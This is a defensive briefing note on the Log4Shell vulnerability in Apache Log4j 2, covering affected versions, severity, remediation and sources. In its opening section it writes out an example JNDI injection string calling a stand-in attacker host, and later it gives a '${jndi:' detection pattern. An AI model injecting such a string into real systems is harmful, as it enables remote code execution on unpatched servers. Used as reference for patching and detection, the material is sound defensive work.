# Log4Shell Security Notes

Briefing reference material for the quarterly security briefing. All facts verified against
primary sources (Apache Logging Services security page, NVD, CISA) as of the date of this write-up.

## What Log4Shell is

A critical remote code execution (RCE) vulnerability in **Apache Log4j 2**, a widely used Java
logging library. Attackers who can control log message content can inject a JNDI lookup string
(e.g. `${jndi:ldap://attacker.example/a}`). When Log4j processes the string, it fetches and
executes arbitrary code from the attacker-controlled server, giving remote control of the
affected system.

- Discovery: Chen Zhaojun, Alibaba Cloud Security Team (November 2021)
- Only `log4j-core` is affected — `log4j-api` alone is not affected (no lookups).

## CVE

**CVE-2021-44228** — the Log4Shell original.

## Affected vs. fixed versions (Apache Log4j 2)

| Version | Status |
| --- | --- |
| 2.0-beta9 – 2.14.1 | **Vulnerable** |
| 2.15.0 | Fix for CVE-2021-44228 (JNDI LDAP restricted to localhost by default) — incomplete fix; CVE-2021-45046 emerged |
| 2.12.2 / 2.12.3 / 2.3.1 | Security releases for Java 7 / Java 6 |
| 2.16.0 | **Full fix for CVE-2021-44228** — JNDI lookups removed entirely |
| 2.17.1+ | Recommended for production — also fixes CVE-2021-45046, -45105, -44832 |

Affected ranges (per Apache/CISA): `[2.0-beta9, 2.3.1) ∪ [2.4, 2.12.2) ∪ [2.13.0, 2.15.0)`

## Severity

- **CVSS 3.x base score: 10.0 CRITICAL**
- Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
- Requires no privileges, no user interaction, network attack, full confidentiality/integrity/availability impact.
- CISA Emergency Directive 22-02 rated the overall risk **extremely high** and required agencies to patch or remove affected assets.

## Why it matters

- Patching the JDK is **not** sufficient — the vulnerable `log4j-core` JAR itself must be upgraded.
- Exploitation was fast, mass-scale, and heavily automated; detection requires network-based
  monitoring and scanning, not just a release patch.

## Remediation summary (see the "Log4Shell remediation checklist" issue in GitHub)

1. **Upgrade** `log4j-core` to 2.16.0+ (2.17.1+ recommended); see the upgrade sub-issue.
2. **Detect** vulnerable deployments — scan logs/JARs for `${jndi:` patterns, inventory every
   `log4j-core` artifact (including transitive dependencies), use CISA's known-products
   repository and recommended scanners.
3. **Harden** as defense in depth while patching: set `-Dlog4j2.formatMsgNoLookups=true`
   (temp measure) and/or remove `JndiLookup.class` from the classpath.
4. **Scan continuously** in CI/CD — GitHub Dependabot, OWASP Dependency-Check, Snyk, and
   `mvn dependency:tree | grep log4j` so vulnerable or newly-introduced versions are caught before release.

## Sources

- Apache Logging Services — Security: https://logging.apache.org/security.html
- NVD — CVE-2021-44228: https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- CISA Emergency Directive 22-02: https://www.cisa.gov/news-events/news/emergency-directive-22-02-apache-log4j-recommended-mitigation-measures
- CISA/AA21-356A Joint Cybersecurity Advisory: https://www.cisa.gov/sites/default/files/publications/AA21-356A_Joint_CSA_Mitigating_Log4Shell_and_Other_Log4j-Related_Vulnerabilities.pdf
- GitHub security blog — identifying Log4j exposure (Dependabot + formatMsgNoLookups): https://github.blog/security/application-security/using-githubs-security-features-identify-log4j-exposure-codebase/
- Snyk — Log4Shell remediation cheat sheet: https://snyk.io/blog/log4shell-remediation-cheat-sheet/